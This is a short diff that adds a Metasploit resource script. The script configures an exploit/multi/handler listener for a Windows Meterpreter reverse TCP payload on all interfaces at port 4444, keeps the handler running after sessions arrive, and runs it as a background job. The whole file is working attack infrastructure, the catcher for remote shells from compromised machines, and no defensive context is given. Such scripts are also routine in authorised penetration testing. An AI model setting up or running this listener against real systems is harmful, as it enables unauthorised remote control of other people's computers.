@@ -1,0 +1,13 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+# host address to listen
+set lhost 0.0.0.0
+
+# port to listen
+set lport 4444
+
+set ExitOnSession false
+
+# run listener for sessions in in background (-j)
+exploit -j 
